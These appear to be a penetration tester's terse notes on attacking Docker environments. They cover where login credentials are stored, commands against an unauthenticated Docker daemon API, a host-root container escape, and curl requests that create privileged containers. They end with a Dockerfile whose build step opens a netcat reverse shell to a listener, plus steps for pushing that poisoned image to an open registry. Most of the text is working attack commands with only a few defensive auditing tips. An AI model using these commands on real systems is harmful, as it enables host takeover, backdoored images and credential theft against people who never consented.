publishing images to Docker Hub requires docker login
	stores creds in $HOME/.docker/config.json

look for Docker Daemon API certs in .docker folder of dev machines


Unauthenticated Docker Daemon API
	get containers
		docker -H tcp://<IP_address>:2375 ps
	execute a command on a container
		docker -H tcp://<IP_address>:2375 exec <container_ID> <command_no_quotes_needed>
	run a container
		docker -H tcp://<IP_address>:2375 run <image_name>
	run a container to get root on host OS 
		docker -H tcp://<IP_address>:2375 run -v /:/hostOS -it --rm chrisfosterelli/rootplease


Working with external data 
	Mount a volume path (-v <host_dir>:<container_dir>)
	mkdir ~/volume_location
	docker run -v ~/volume_location:/container_dir <image_name> 
		container runs as root, so files created by container will be created as root

Mount a bound volume
	docker volume create volume_name
  	docker run -v volume_name:/container_dir <image_name>
 		will also create volume of that name, if not already existing
  	 docker volume inspect volume_name
  	 	will show /var/lib/docker/volume/volume_name/_data

Copy from/to container
  	 cp <container_name>:/<container_path> ./

can override Dockerfile ENTRYPOINT to get shell
	docker run --entrypoint=/bin/ash -it <image_name>

cap_net_raw can allow for ARP spoofing and MITM - see blog.champtar.fr

capabilities can be used to hide privileged binaries 
	we would usually note anything with SETUID running as root
	that would not find processes running with CAP_SYS_ADMIN (essentially root)
		can detect using filecap tool to audit for files with dangerous capabilities
			filecap <directory>

create a privileged container from an image using Docker daemon
	curl -X POST "http://<IP_address>:2375/images/create?fromImage=<image_name>&tag=<image_tag>"
	curl --header "Content-Type: application/json" --request POST --data '{"Image": "<image_name>", "Privileged": true}' http://<IP_address>:2375/containers/create
		this will return an image ID for use in launching it

launch a privileged container from an image using Docker daemon
	curl -X POST http://<IP_address>:2375/containers/<ID>/start

push a malicious image to an unauthenticated repo
	Dockerfile
		FROM debian:jessie-slim
		RUN apt-get update -y
		RUN apt-get install netcat -y
		RUN nc -e /bin/sh <listener_IP> <listener_port>

	Build image with tag (tag req'd to push to remote registries other than Docker Hub)
		docker build -t <image_name>:<version_tag> <path/to/Dockerfile>
		
	Push image to repo
		docker login 	#auth'n to repo - not necessary for unauthenticated repo

		docker tag <image_name>:<version_tag> <repo>/<image_name>:<version_tag>
			**Image Naming outside DockerHub**
				registryDomain/imageName:tag
				DockerHub is default registryDomain
					docker.io/library/<image>
			Creates copy of local image tagged named for repo/image:version

		docker push <repo>/<image_name>:<version>



